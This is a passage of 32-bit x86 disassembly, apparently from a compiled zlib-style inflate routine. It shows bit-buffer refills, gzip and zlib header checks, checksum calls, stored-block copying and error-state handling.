  406b90:	85 ff                	test   %edi,%edi
  406b92:	0f 84 88 04 00 00    	je     0x407020
  406b98:	83 c5 01             	add    $0x1,%ebp
  406b9b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406b9f:	83 ef 01             	sub    $0x1,%edi
  406ba2:	d3 e0                	shl    %cl,%eax
  406ba4:	83 c1 08             	add    $0x8,%ecx
  406ba7:	01 c6                	add    %eax,%esi
  406ba9:	83 f9 1f             	cmp    $0x1f,%ecx
  406bac:	76 e2                	jbe    0x406b90
  406bae:	89 cb                	mov    %ecx,%ebx
  406bb0:	8b 44 24 24          	mov    0x24(%esp),%eax
  406bb4:	39 70 1c             	cmp    %esi,0x1c(%eax)
  406bb7:	0f 84 60 0d 00 00    	je     0x40791d
  406bbd:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  406bc4:	c7 41 18 38 d7 40 00 	movl   $0x40d738,0x18(%ecx)
  406bcb:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406bd1:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406bd6:	e9 7e f1 ff ff       	jmp    0x405d59
  406bdb:	90                   	nop
  406bdc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406be0:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  406be4:	c7 44 24 38 fd ff ff 	movl   $0xfffffffd,0x38(%esp)
  406beb:	ff 
  406bec:	89 de                	mov    %ebx,%esi
  406bee:	89 eb                	mov    %ebp,%ebx
  406bf0:	89 fd                	mov    %edi,%ebp
  406bf2:	8b 7c 24 24          	mov    0x24(%esp),%edi
  406bf6:	e9 a5 f7 ff ff       	jmp    0x4063a0
  406bfb:	90                   	nop
  406bfc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406c00:	8b 44 24 24          	mov    0x24(%esp),%eax
  406c04:	8b 50 10             	mov    0x10(%eax),%edx
  406c07:	f6 c6 10             	test   $0x10,%dh
  406c0a:	0f 84 9a fe ff ff    	je     0x406aaa
  406c10:	85 ff                	test   %edi,%edi
  406c12:	0f 84 38 f5 ff ff    	je     0x406150
  406c18:	89 74 24 48          	mov    %esi,0x48(%esp)
  406c1c:	31 d2                	xor    %edx,%edx
  406c1e:	89 6c 24 3c          	mov    %ebp,0x3c(%esp)
  406c22:	89 7c 24 40          	mov    %edi,0x40(%esp)
  406c26:	89 5c 24 54          	mov    %ebx,0x54(%esp)
  406c2a:	8b 74 24 24          	mov    0x24(%esp),%esi
  406c2e:	eb 06                	jmp    0x406c36
  406c30:	3b 54 24 40          	cmp    0x40(%esp),%edx
  406c34:	73 31                	jae    0x406c67
  406c36:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406c3a:	83 c2 01             	add    $0x1,%edx
  406c3d:	0f b6 6c 10 ff       	movzbl -0x1(%eax,%edx,1),%ebp
  406c42:	8b 46 20             	mov    0x20(%esi),%eax
  406c45:	85 c0                	test   %eax,%eax
  406c47:	89 e9                	mov    %ebp,%ecx
  406c49:	74 18                	je     0x406c63
  406c4b:	8b 78 24             	mov    0x24(%eax),%edi
  406c4e:	85 ff                	test   %edi,%edi
  406c50:	74 11                	je     0x406c63
  406c52:	8b 5e 40             	mov    0x40(%esi),%ebx
  406c55:	3b 58 28             	cmp    0x28(%eax),%ebx
  406c58:	73 09                	jae    0x406c63
  406c5a:	8d 43 01             	lea    0x1(%ebx),%eax
  406c5d:	89 46 40             	mov    %eax,0x40(%esi)
  406c60:	88 0c 1f             	mov    %cl,(%edi,%ebx,1)
  406c63:	85 ed                	test   %ebp,%ebp
  406c65:	75 c9                	jne    0x406c30
  406c67:	8b 44 24 24          	mov    0x24(%esp),%eax
  406c6b:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  406c6f:	8b 7c 24 40          	mov    0x40(%esp),%edi
  406c73:	8b 6c 24 3c          	mov    0x3c(%esp),%ebp
  406c77:	8b 74 24 48          	mov    0x48(%esp),%esi
  406c7b:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  406c7f:	f6 40 11 02          	testb  $0x2,0x11(%eax)
  406c83:	0f 85 07 07 00 00    	jne    0x407390
  406c89:	8b 44 24 44          	mov    0x44(%esp),%eax
  406c8d:	29 d7                	sub    %edx,%edi
  406c8f:	01 d5                	add    %edx,%ebp
  406c91:	85 c0                	test   %eax,%eax
  406c93:	0f 85 b7 f4 ff ff    	jne    0x406150
  406c99:	8b 44 24 24          	mov    0x24(%esp),%eax
  406c9d:	8b 50 10             	mov    0x10(%eax),%edx
  406ca0:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ca4:	c7 00 08 00 00 00    	movl   $0x8,(%eax)
  406caa:	f6 c6 02             	test   $0x2,%dh
  406cad:	0f 84 91 03 00 00    	je     0x407044
  406cb3:	83 fb 0f             	cmp    $0xf,%ebx
  406cb6:	77 2c                	ja     0x406ce4
  406cb8:	85 ff                	test   %edi,%edi
  406cba:	0f 84 90 f4 ff ff    	je     0x406150
  406cc0:	89 d9                	mov    %ebx,%ecx
  406cc2:	eb 08                	jmp    0x406ccc
  406cc4:	85 ff                	test   %edi,%edi
  406cc6:	0f 84 54 03 00 00    	je     0x407020
  406ccc:	83 c5 01             	add    $0x1,%ebp
  406ccf:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406cd3:	83 ef 01             	sub    $0x1,%edi
  406cd6:	d3 e0                	shl    %cl,%eax
  406cd8:	83 c1 08             	add    $0x8,%ecx
  406cdb:	01 c6                	add    %eax,%esi
  406cdd:	83 f9 0f             	cmp    $0xf,%ecx
  406ce0:	76 e2                	jbe    0x406cc4
  406ce2:	89 cb                	mov    %ecx,%ebx
  406ce4:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406ce8:	0f b7 41 18          	movzwl 0x18(%ecx),%eax
  406cec:	39 f0                	cmp    %esi,%eax
  406cee:	0f 84 4c 03 00 00    	je     0x407040
  406cf4:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406cfb:	c7 40 18 df d5 40 00 	movl   $0x40d5df,0x18(%eax)
  406d02:	c7 01 1d 00 00 00    	movl   $0x1d,(%ecx)
  406d08:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406d0d:	e9 47 f0 ff ff       	jmp    0x405d59
  406d12:	8b 44 24 24          	mov    0x24(%esp),%eax
  406d16:	8b 50 10             	mov    0x10(%eax),%edx
  406d19:	eb 8f                	jmp    0x406caa
  406d1b:	90                   	nop
  406d1c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  406d20:	83 fb 0f             	cmp    $0xf,%ebx
  406d23:	77 2c                	ja     0x406d51
  406d25:	85 ff                	test   %edi,%edi
  406d27:	0f 84 23 f4 ff ff    	je     0x406150
  406d2d:	89 d9                	mov    %ebx,%ecx
  406d2f:	eb 08                	jmp    0x406d39
  406d31:	85 ff                	test   %edi,%edi
  406d33:	0f 84 e7 02 00 00    	je     0x407020
  406d39:	83 c5 01             	add    $0x1,%ebp
  406d3c:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406d40:	83 ef 01             	sub    $0x1,%edi
  406d43:	d3 e0                	shl    %cl,%eax
  406d45:	83 c1 08             	add    $0x8,%ecx
  406d48:	01 c6                	add    %eax,%esi
  406d4a:	83 f9 0f             	cmp    $0xf,%ecx
  406d4d:	76 e2                	jbe    0x406d31
  406d4f:	89 cb                	mov    %ecx,%ebx
  406d51:	8b 54 24 24          	mov    0x24(%esp),%edx
  406d55:	89 f0                	mov    %esi,%eax
  406d57:	3c 08                	cmp    $0x8,%al
  406d59:	89 72 10             	mov    %esi,0x10(%edx)
  406d5c:	0f 84 eb 08 00 00    	je     0x40764d
  406d62:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406d69:	c7 40 18 97 d5 40 00 	movl   $0x40d597,0x18(%eax)
  406d70:	c7 02 1d 00 00 00    	movl   $0x1d,(%edx)
  406d76:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406d7b:	e9 d9 ef ff ff       	jmp    0x405d59
  406d80:	8b 44 24 24          	mov    0x24(%esp),%eax
  406d84:	8b 50 08             	mov    0x8(%eax),%edx
  406d87:	85 d2                	test   %edx,%edx
  406d89:	0f 84 01 05 00 00    	je     0x407290
  406d8f:	83 fb 0f             	cmp    $0xf,%ebx
  406d92:	77 2c                	ja     0x406dc0
  406d94:	85 ff                	test   %edi,%edi
  406d96:	0f 84 07 08 00 00    	je     0x4075a3
  406d9c:	89 d9                	mov    %ebx,%ecx
  406d9e:	eb 08                	jmp    0x406da8
  406da0:	85 ff                	test   %edi,%edi
  406da2:	0f 84 78 02 00 00    	je     0x407020
  406da8:	83 c5 01             	add    $0x1,%ebp
  406dab:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406daf:	83 ef 01             	sub    $0x1,%edi
  406db2:	d3 e0                	shl    %cl,%eax
  406db4:	83 c1 08             	add    $0x8,%ecx
  406db7:	01 c6                	add    %eax,%esi
  406db9:	83 f9 0f             	cmp    $0xf,%ecx
  406dbc:	76 e2                	jbe    0x406da0
  406dbe:	89 cb                	mov    %ecx,%ebx
  406dc0:	81 fe 1f 8b 00 00    	cmp    $0x8b1f,%esi
  406dc6:	75 09                	jne    0x406dd1
  406dc8:	f6 c2 02             	test   $0x2,%dl
  406dcb:	0f 85 d7 0b 00 00    	jne    0x4079a8
  406dd1:	8b 44 24 24          	mov    0x24(%esp),%eax
  406dd5:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  406ddc:	8b 40 20             	mov    0x20(%eax),%eax
  406ddf:	85 c0                	test   %eax,%eax
  406de1:	74 07                	je     0x406dea
  406de3:	c7 40 30 ff ff ff ff 	movl   $0xffffffff,0x30(%eax)
  406dea:	83 e2 01             	and    $0x1,%edx
  406ded:	0f 84 07 07 00 00    	je     0x4074fa
  406df3:	89 f0                	mov    %esi,%eax
  406df5:	89 f1                	mov    %esi,%ecx
  406df7:	ba 85 10 42 08       	mov    $0x8421085,%edx
  406dfc:	c1 e0 08             	shl    $0x8,%eax
  406dff:	c1 e9 08             	shr    $0x8,%ecx
  406e02:	0f b7 c0             	movzwl %ax,%eax
  406e05:	01 c1                	add    %eax,%ecx
  406e07:	89 c8                	mov    %ecx,%eax
  406e09:	f7 e2                	mul    %edx
  406e0b:	89 c8                	mov    %ecx,%eax
  406e0d:	29 d0                	sub    %edx,%eax
  406e0f:	d1 e8                	shr    $1,%eax
  406e11:	01 d0                	add    %edx,%eax
  406e13:	c1 e8 04             	shr    $0x4,%eax
  406e16:	89 c2                	mov    %eax,%edx
  406e18:	c1 e2 05             	shl    $0x5,%edx
  406e1b:	29 c2                	sub    %eax,%edx
  406e1d:	39 d1                	cmp    %edx,%ecx
  406e1f:	0f 85 d5 06 00 00    	jne    0x4074fa
  406e25:	89 f0                	mov    %esi,%eax
  406e27:	83 e0 0f             	and    $0xf,%eax
  406e2a:	83 f8 08             	cmp    $0x8,%eax
  406e2d:	0f 84 01 0b 00 00    	je     0x407934
  406e33:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406e3a:	c7 40 18 97 d5 40 00 	movl   $0x40d597,0x18(%eax)
  406e41:	8b 44 24 24          	mov    0x24(%esp),%eax
  406e45:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406e4b:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406e50:	e9 04 ef ff ff       	jmp    0x405d59
  406e55:	89 d9                	mov    %ebx,%ecx
  406e57:	83 e3 f8             	and    $0xfffffff8,%ebx
  406e5a:	83 e1 07             	and    $0x7,%ecx
  406e5d:	d3 ee                	shr    %cl,%esi
  406e5f:	83 fb 1f             	cmp    $0x1f,%ebx
  406e62:	77 2c                	ja     0x406e90
  406e64:	85 ff                	test   %edi,%edi
  406e66:	0f 84 e4 f2 ff ff    	je     0x406150
  406e6c:	89 d9                	mov    %ebx,%ecx
  406e6e:	eb 08                	jmp    0x406e78
  406e70:	85 ff                	test   %edi,%edi
  406e72:	0f 84 a8 01 00 00    	je     0x407020
  406e78:	83 c5 01             	add    $0x1,%ebp
  406e7b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406e7f:	83 ef 01             	sub    $0x1,%edi
  406e82:	d3 e0                	shl    %cl,%eax
  406e84:	83 c1 08             	add    $0x8,%ecx
  406e87:	01 c6                	add    %eax,%esi
  406e89:	83 f9 1f             	cmp    $0x1f,%ecx
  406e8c:	76 e2                	jbe    0x406e70
  406e8e:	89 cb                	mov    %ecx,%ebx
  406e90:	89 f2                	mov    %esi,%edx
  406e92:	0f b7 c6             	movzwl %si,%eax
  406e95:	c1 ea 10             	shr    $0x10,%edx
  406e98:	81 f2 ff ff 00 00    	xor    $0xffff,%edx
  406e9e:	39 d0                	cmp    %edx,%eax
  406ea0:	0f 84 83 07 00 00    	je     0x407629
  406ea6:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406ead:	c7 40 18 06 d6 40 00 	movl   $0x40d606,0x18(%eax)
  406eb4:	8b 44 24 24          	mov    0x24(%esp),%eax
  406eb8:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406ebe:	b8 1d 00 00 00       	mov    $0x1d,%eax
  406ec3:	e9 91 ee ff ff       	jmp    0x405d59
  406ec8:	90                   	nop
  406ec9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  406ed0:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  406ed4:	85 c9                	test   %ecx,%ecx
  406ed6:	0f 84 74 f2 ff ff    	je     0x406150
  406edc:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ee0:	8b 54 24 30          	mov    0x30(%esp),%edx
  406ee4:	8b 40 40             	mov    0x40(%eax),%eax
  406ee7:	88 02                	mov    %al,(%edx)
  406ee9:	89 c8                	mov    %ecx,%eax
  406eeb:	83 e8 01             	sub    $0x1,%eax
  406eee:	89 44 24 28          	mov    %eax,0x28(%esp)
  406ef2:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ef6:	c7 00 14 00 00 00    	movl   $0x14,(%eax)
  406efc:	8d 42 01             	lea    0x1(%edx),%eax
  406eff:	89 44 24 30          	mov    %eax,0x30(%esp)
  406f03:	b8 14 00 00 00       	mov    $0x14,%eax
  406f08:	e9 4c ee ff ff       	jmp    0x405d59
  406f0d:	8d 76 00             	lea    0x0(%esi),%esi
  406f10:	8b 44 24 24          	mov    0x24(%esp),%eax
  406f14:	8b 40 08             	mov    0x8(%eax),%eax
  406f17:	85 c0                	test   %eax,%eax
  406f19:	0f 84 61 03 00 00    	je     0x407280
  406f1f:	83 fb 1f             	cmp    $0x1f,%ebx
  406f22:	77 2c                	ja     0x406f50
  406f24:	85 ff                	test   %edi,%edi
  406f26:	0f 84 24 f2 ff ff    	je     0x406150
  406f2c:	89 d9                	mov    %ebx,%ecx
  406f2e:	eb 08                	jmp    0x406f38
  406f30:	85 ff                	test   %edi,%edi
  406f32:	0f 84 e8 00 00 00    	je     0x407020
  406f38:	83 c5 01             	add    $0x1,%ebp
  406f3b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  406f3f:	83 ef 01             	sub    $0x1,%edi
  406f42:	d3 e0                	shl    %cl,%eax
  406f44:	83 c1 08             	add    $0x8,%ecx
  406f47:	01 c6                	add    %eax,%esi
  406f49:	83 f9 1f             	cmp    $0x1f,%ecx
  406f4c:	76 e2                	jbe    0x406f30
  406f4e:	89 cb                	mov    %ecx,%ebx
  406f50:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  406f54:	2b 44 24 28          	sub    0x28(%esp),%eax
  406f58:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  406f5f:	8b 54 24 24          	mov    0x24(%esp),%edx
  406f63:	01 41 14             	add    %eax,0x14(%ecx)
  406f66:	01 42 1c             	add    %eax,0x1c(%edx)
  406f69:	85 c0                	test   %eax,%eax
  406f6b:	74 39                	je     0x406fa6
  406f6d:	8b 52 10             	mov    0x10(%edx),%edx
  406f70:	89 44 24 08          	mov    %eax,0x8(%esp)
  406f74:	85 d2                	test   %edx,%edx
  406f76:	8b 54 24 30          	mov    0x30(%esp),%edx
  406f7a:	0f 84 99 08 00 00    	je     0x407819
  406f80:	29 c2                	sub    %eax,%edx
  406f82:	8b 44 24 24          	mov    0x24(%esp),%eax
  406f86:	89 54 24 04          	mov    %edx,0x4(%esp)
  406f8a:	8b 40 18             	mov    0x18(%eax),%eax
  406f8d:	89 04 24             	mov    %eax,(%esp)
  406f90:	e8 7b 17 00 00       	call   0x408710
  406f95:	8b 54 24 24          	mov    0x24(%esp),%edx
  406f99:	89 42 18             	mov    %eax,0x18(%edx)
  406f9c:	8b 94 24 90 00 00 00 	mov    0x90(%esp),%edx
  406fa3:	89 42 30             	mov    %eax,0x30(%edx)
  406fa6:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406faa:	89 f0                	mov    %esi,%eax
  406fac:	8b 49 10             	mov    0x10(%ecx),%ecx
  406faf:	85 c9                	test   %ecx,%ecx
  406fb1:	75 22                	jne    0x406fd5
  406fb3:	89 f2                	mov    %esi,%edx
  406fb5:	c1 e8 18             	shr    $0x18,%eax
  406fb8:	c1 e2 18             	shl    $0x18,%edx
  406fbb:	01 c2                	add    %eax,%edx
  406fbd:	89 f0                	mov    %esi,%eax
  406fbf:	c1 e8 08             	shr    $0x8,%eax
  406fc2:	25 00 ff 00 00       	and    $0xff00,%eax
  406fc7:	01 c2                	add    %eax,%edx
  406fc9:	89 f0                	mov    %esi,%eax
  406fcb:	25 00 ff 00 00       	and    $0xff00,%eax
  406fd0:	c1 e0 08             	shl    $0x8,%eax
  406fd3:	01 d0                	add    %edx,%eax
  406fd5:	8b 54 24 24          	mov    0x24(%esp),%edx
  406fd9:	3b 42 18             	cmp    0x18(%edx),%eax
  406fdc:	0f 84 8a 02 00 00    	je     0x40726c
  406fe2:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  406fe9:	c7 40 18 23 d7 40 00 	movl   $0x40d723,0x18(%eax)
  406ff0:	8b 44 24 24          	mov    0x24(%esp),%eax
  406ff4:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  406ffa:	8b 44 24 28          	mov    0x28(%esp),%eax
  406ffe:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  407002:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407007:	e9 4d ed ff ff       	jmp    0x405d59
  40700c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407010:	ba 00 01 00 00       	mov    $0x100,%edx
  407015:	e9 80 f4 ff ff       	jmp    0x40649a
  40701a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  407020:	89 eb                	mov    %ebp,%ebx
  407022:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  407026:	89 fd                	mov    %edi,%ebp
  407028:	89 ce                	mov    %ecx,%esi
  40702a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40702e:	e9 6d f3 ff ff       	jmp    0x4063a0
  407033:	83 e8 80             	sub    $0xffffff80,%eax
  407036:	e9 5d f4 ff ff       	jmp    0x406498
  40703b:	90                   	nop
  40703c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407040:	31 db                	xor    %ebx,%ebx
  407042:	31 f6                	xor    %esi,%esi
  407044:	8b 44 24 24          	mov    0x24(%esp),%eax
  407048:	8b 40 20             	mov    0x20(%eax),%eax
  40704b:	85 c0                	test   %eax,%eax
  40704d:	74 10                	je     0x40705f
  40704f:	c1 fa 09             	sar    $0x9,%edx
  407052:	c7 40 30 01 00 00 00 	movl   $0x1,0x30(%eax)
  407059:	83 e2 01             	and    $0x1,%edx
  40705c:	89 50 2c             	mov    %edx,0x2c(%eax)
  40705f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  407066:	00 
  407067:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40706e:	00 
  40706f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  407076:	e8 95 16 00 00       	call   0x408710
  40707b:	8b 54 24 24          	mov    0x24(%esp),%edx
  40707f:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  407086:	89 42 18             	mov    %eax,0x18(%edx)
  407089:	89 41 30             	mov    %eax,0x30(%ecx)
  40708c:	b8 0b 00 00 00       	mov    $0xb,%eax
  407091:	c7 02 0b 00 00 00    	movl   $0xb,(%edx)
  407097:	e9 bd ec ff ff       	jmp    0x405d59
  40709c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4070a0:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4070a7:	8b 40 04             	mov    0x4(%eax),%eax
  4070aa:	85 c0                	test   %eax,%eax
  4070ac:	75 36                	jne    0x4070e4
  4070ae:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
  4070b5:	00 
  4070b6:	e9 44 ec ff ff       	jmp    0x405cff
  4070bb:	90                   	nop
  4070bc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4070c0:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4070c7:	8b 40 0c             	mov    0xc(%eax),%eax
  4070ca:	89 44 24 24          	mov    %eax,0x24(%esp)
  4070ce:	29 f0                	sub    %esi,%eax
  4070d0:	89 44 24 04          	mov    %eax,0x4(%esp)
  4070d4:	8b 47 18             	mov    0x18(%edi),%eax
  4070d7:	89 04 24             	mov    %eax,(%esp)
  4070da:	e8 e1 10 00 00       	call   0x4081c0
  4070df:	e9 7c f3 ff ff       	jmp    0x406460
  4070e4:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4070e9:	e9 87 f2 ff ff       	jmp    0x406375
  4070ee:	66 90                	xchg   %ax,%ax
  4070f0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4070f4:	c7 00 0b 00 00 00    	movl   $0xb,(%eax)
  4070fa:	b8 0b 00 00 00       	mov    $0xb,%eax
  4070ff:	e9 55 ec ff ff       	jmp    0x405d59
  407104:	8b 44 24 30          	mov    0x30(%esp),%eax
  407108:	29 c8                	sub    %ecx,%eax
  40710a:	89 44 24 40          	mov    %eax,0x40(%esp)
  40710e:	8b 44 24 24          	mov    0x24(%esp),%eax
  407112:	8b 48 40             	mov    0x40(%eax),%ecx
  407115:	89 ca                	mov    %ecx,%edx
  407117:	8b 44 24 28          	mov    0x28(%esp),%eax
  40711b:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  40711f:	39 c1                	cmp    %eax,%ecx
  407121:	0f 47 c8             	cmova  %eax,%ecx
  407124:	29 c8                	sub    %ecx,%eax
  407126:	29 ca                	sub    %ecx,%edx
  407128:	89 44 24 28          	mov    %eax,0x28(%esp)
  40712c:	8b 44 24 24          	mov    0x24(%esp),%eax
  407130:	89 50 40             	mov    %edx,0x40(%eax)
  407133:	8b 54 24 30          	mov    0x30(%esp),%edx
  407137:	8b 44 24 40          	mov    0x40(%esp),%eax
  40713b:	01 d1                	add    %edx,%ecx
  40713d:	8d 76 00             	lea    0x0(%esi),%esi
  407140:	83 c0 01             	add    $0x1,%eax
  407143:	0f b6 58 ff          	movzbl -0x1(%eax),%ebx
  407147:	83 c2 01             	add    $0x1,%edx
  40714a:	39 ca                	cmp    %ecx,%edx
  40714c:	88 5a ff             	mov    %bl,-0x1(%edx)
  40714f:	75 ef                	jne    0x407140
  407151:	8b 44 24 24          	mov    0x24(%esp),%eax
  407155:	89 54 24 30          	mov    %edx,0x30(%esp)
  407159:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  40715d:	8b 48 40             	mov    0x40(%eax),%ecx
  407160:	85 c9                	test   %ecx,%ecx
  407162:	74 0c                	je     0x407170
  407164:	8b 00                	mov    (%eax),%eax
  407166:	e9 e5 eb ff ff       	jmp    0x405d50
  40716b:	90                   	nop
  40716c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407170:	8b 44 24 24          	mov    0x24(%esp),%eax
  407174:	c7 00 14 00 00 00    	movl   $0x14,(%eax)
  40717a:	b8 14 00 00 00       	mov    $0x14,%eax
  40717f:	e9 d5 eb ff ff       	jmp    0x405d59
  407184:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  40718b:	8b 54 24 30          	mov    0x30(%esp),%edx
  40718f:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  407193:	89 28                	mov    %ebp,(%eax)
  407195:	89 78 04             	mov    %edi,0x4(%eax)
  407198:	89 50 0c             	mov    %edx,0xc(%eax)
  40719b:	89 48 10             	mov    %ecx,0x10(%eax)
  40719e:	8b 44 24 24          	mov    0x24(%esp),%eax
  4071a2:	89 70 38             	mov    %esi,0x38(%eax)
  4071a5:	89 58 3c             	mov    %ebx,0x3c(%eax)
  4071a8:	89 c6                	mov    %eax,%esi
  4071aa:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4071ae:	89 44 24 04          	mov    %eax,0x4(%esp)
  4071b2:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4071b9:	89 04 24             	mov    %eax,(%esp)
  4071bc:	e8 0f 1e 00 00       	call   0x408fd0
  4071c1:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4071c8:	8b 40 0c             	mov    0xc(%eax),%eax
  4071cb:	89 44 24 30          	mov    %eax,0x30(%esp)
  4071cf:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4071d6:	8b 40 10             	mov    0x10(%eax),%eax
  4071d9:	89 44 24 28          	mov    %eax,0x28(%esp)
  4071dd:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4071e4:	8b 28                	mov    (%eax),%ebp
  4071e6:	8b 78 04             	mov    0x4(%eax),%edi
  4071e9:	89 f0                	mov    %esi,%eax
  4071eb:	8b 58 3c             	mov    0x3c(%eax),%ebx
  4071ee:	8b 00                	mov    (%eax),%eax
  4071f0:	8b 76 38             	mov    0x38(%esi),%esi
  4071f3:	83 f8 0b             	cmp    $0xb,%eax
  4071f6:	0f 85 54 eb ff ff    	jne    0x405d50
  4071fc:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407200:	c7 81 c4 1b 00 00 ff 	movl   $0xffffffff,0x1bc4(%ecx)
  407207:	ff ff ff 
  40720a:	e9 4a eb ff ff       	jmp    0x405d59
  40720f:	90                   	nop
  407210:	39 d3                	cmp    %edx,%ebx
  407212:	73 2b                	jae    0x40723f
  407214:	85 ff                	test   %edi,%edi
  407216:	0f 84 34 ef ff ff    	je     0x406150
  40721c:	89 d9                	mov    %ebx,%ecx
  40721e:	eb 08                	jmp    0x407228
  407220:	85 ff                	test   %edi,%edi
  407222:	0f 84 f8 fd ff ff    	je     0x407020
  407228:	83 c5 01             	add    $0x1,%ebp
  40722b:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  40722f:	83 ef 01             	sub    $0x1,%edi
  407232:	d3 e0                	shl    %cl,%eax
  407234:	83 c1 08             	add    $0x8,%ecx
  407237:	01 c6                	add    %eax,%esi
  407239:	39 d1                	cmp    %edx,%ecx
  40723b:	72 e3                	jb     0x407220
  40723d:	89 cb                	mov    %ecx,%ebx
  40723f:	89 d1                	mov    %edx,%ecx
  407241:	b8 01 00 00 00       	mov    $0x1,%eax
  407246:	29 d3                	sub    %edx,%ebx
  407248:	d3 e0                	shl    %cl,%eax
  40724a:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40724e:	83 e8 01             	sub    $0x1,%eax
  407251:	21 f0                	and    %esi,%eax
  407253:	03 41 40             	add    0x40(%ecx),%eax
  407256:	89 41 40             	mov    %eax,0x40(%ecx)
  407259:	89 d1                	mov    %edx,%ecx
  40725b:	d3 ee                	shr    %cl,%esi
  40725d:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407261:	01 91 c4 1b 00 00    	add    %edx,0x1bc4(%ecx)
  407267:	e9 0d ef ff ff       	jmp    0x406179
  40726c:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  407270:	8b 42 08             	mov    0x8(%edx),%eax
  407273:	31 f6                	xor    %esi,%esi
  407275:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
  407279:	31 db                	xor    %ebx,%ebx
  40727b:	90                   	nop
  40727c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  407280:	8b 54 24 24          	mov    0x24(%esp),%edx
  407284:	c7 02 1b 00 00 00    	movl   $0x1b,(%edx)
  40728a:	e9 d8 f8 ff ff       	jmp    0x406b67
  40728f:	90                   	nop
  407290:	8b 44 24 24          	mov    0x24(%esp),%eax
  407294:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  40729a:	b8 0c 00 00 00       	mov    $0xc,%eax
  40729f:	e9 b5 ea ff ff       	jmp    0x405d59
  4072a4:	8b 80 c0 1b 00 00    	mov    0x1bc0(%eax),%eax
  4072aa:	85 c0                	test   %eax,%eax
  4072ac:	0f 84 bc ec ff ff    	je     0x405f6e
  4072b2:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4072b9:	c7 40 18 05 d7 40 00 	movl   $0x40d705,0x18(%eax)
  4072c0:	8b 44 24 24          	mov    0x24(%esp),%eax
  4072c4:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4072ca:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4072cf:	e9 85 ea ff ff       	jmp    0x405d59
  4072d4:	8b 54 24 24          	mov    0x24(%esp),%edx
  4072d8:	8b 92 c4 1b 00 00    	mov    0x1bc4(%edx),%edx
  4072de:	89 c1                	mov    %eax,%ecx
  4072e0:	29 c3                	sub    %eax,%ebx
  4072e2:	01 d0                	add    %edx,%eax
  4072e4:	d3 ee                	shr    %cl,%esi
